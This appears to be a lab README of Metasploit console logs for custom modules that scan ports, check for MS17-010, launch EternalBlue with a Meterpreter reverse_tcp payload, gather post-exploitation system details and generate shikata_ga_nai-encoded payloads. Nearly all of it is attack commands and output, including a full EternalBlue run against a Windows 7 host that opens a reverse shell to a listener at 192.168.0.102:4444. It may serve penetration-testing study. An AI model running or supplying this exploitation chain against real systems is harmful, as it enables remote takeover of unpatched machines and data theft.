# Custom_port_scanner.rb.
``` msf6 auxiliary(scanner/ports/custom_port_scanner) >  set RHOSTS 192.168.0.218RHOSTS => 192.168.0.218
msf6 auxiliary(scanner/ports/custom_port_scanner) > set STARTPORT 20
STARTPORT => 20
msf6 auxiliary(scanner/ports/custom_port_scanner) > set ENDPORT 1000
ENDPORT => 1000
msf6 auxiliary(scanner/ports/custom_port_scanner) > run

[*] 192.168.0.218:        - Running module against 192.168.0.218
[+] 192.168.0.218:        - 192.168.0.218:135 - Port 135 is open on 192.168.0.218
[+] 192.168.0.218:        - 192.168.0.218:139 - Port 139 is open on 192.168.0.218
[+] 192.168.0.218:        - 192.168.0.218:445 - Port 445 is open on 192.168.0.218
[*] 192.168.0.218:        - Open ports on 192.168.0.218: 135, 139, 445
[*] 192.168.0.218:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# Vulnerability_checker.rb
```msf6 auxiliary(scanner/ports/vulnerability_checker) > use auxiliary/scanner/ports/vulnerability_checker.rb
msf6 auxiliary(scanner/ports/vulnerability_checker) > set RHOST 172.31.128.202
RHOST => 172.31.128.202
msf6 auxiliary(scanner/ports/vulnerability_checker) > run

[*] 172.31.128.202:445    - Checking 172.31.128.202 for MS17-010 vulnerability
[+] 172.31.128.202:445    - 172.31.128.202 is vulnerable to MS17-010.
[*] 172.31.128.202:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

# Automated_exploit_launcher.rb
```
msf6 auxiliary(scanner/ports/automated_exploit_launcher) > set RHOST 172.31.128.202
RHOST => 172.31.128.202
msf6 auxiliary(scanner/ports/automated_exploit_launcher) > set EXPLOIT exploit/windows/smb/ms17_010_eternalblue
EXPLOIT => exploit/windows/smb/ms17_010_eternalblue
msf6 auxiliary(scanner/ports/automated_exploit_launcher) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 auxiliary(scanner/ports/automated_exploit_launcher) > set LHOST 192.168.0.102
LHOST => 192.168.0.102
msf6 auxiliary(scanner/ports/automated_exploit_launcher) > run

[*] Launching exploit exploit/windows/smb/ms17_010_eternalblue against 172.31.128.202 with payload windows/x64/meterpreter/reverse_tcp
[*] Running exploit...
[*] Sending stage (200262 bytes) to 172.31.128.202
[*] Auxiliary module execution completed
```

# information_gathering.rb
```
msf6 post(windows/gather/information_gathering) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/information_gathering) > run

[*] Gathering system information from 192.168.0.218
[*] OS: Windows 7 (6.1 Build 7601, Service Pack 1).
[*] Computer: WIN-845Q99OO4PP
[*] User: NT AUTHORITY\SYSTEM
[*] Interface: Local Area Connection 3, IP: 192.168.0.218
[*] Process 0 - [System Process]
[*] Process 4 - System
[*] Post module execution completed
```
# custom_payload_generator.rb
```msf6 > use auxiliary/payload/custom_payload_generator
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 auxiliary(payload/custom_payload_generator) > set LHOST 192.168.0.102
LHOST => 192.168.0.102
msf6 auxiliary(payload/custom_payload_generator) > set LPORT 4444
LPORT => 4444
msf6 auxiliary(payload/custom_payload_generator) > set ITERATIONS 3
ITERATIONS => 3
msf6 auxiliary(payload/custom_payload_generator) > run

[*] Generating payload with encoding: x86/shikata_ga_nai
[+] Generated encoded payload: \xdd\xc0\xbb\x11\x6c\xbe\xc4\xd9\x74\x24\xf4\x58\x2...
[*] Auxiliary module execution completed
```

# extra
```[*] Started reverse TCP handler on 192.168.0.102:4444 
[*] 192.168.0.218:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.0.218:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.0.218:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.0.218:445 - The target is vulnerable.
[*] 192.168.0.218:445 - Connecting to target for exploitation.
[+] 192.168.0.218:445 - Connection established for exploitation.
[+] 192.168.0.218:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.0.218:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.0.218:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.0.218:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.0.218:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.0.218:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.0.218:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.0.218:445 - Sending all but last fragment of exploit packet
[*] 192.168.0.218:445 - Starting non-paged pool grooming
[+] 192.168.0.218:445 - Sending SMBv2 buffers
[+] 192.168.0.218:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.0.218:445 - Sending final SMBv2 buffers.
[*] 192.168.0.218:445 - Sending last fragment of exploit packet!
[*] 192.168.0.218:445 - Receiving response from exploit packet
[+] 192.168.0.218:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.0.218:445 - Sending egg to corrupted connection.
[*] 192.168.0.218:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.0.218
[*] Meterpreter session 1 opened (192.168.0.102:4444 -> 192.168.0.218:49159) at 2025-05-09 20:58:09 -0400
[+] 192.168.0.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.0.218:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > 
```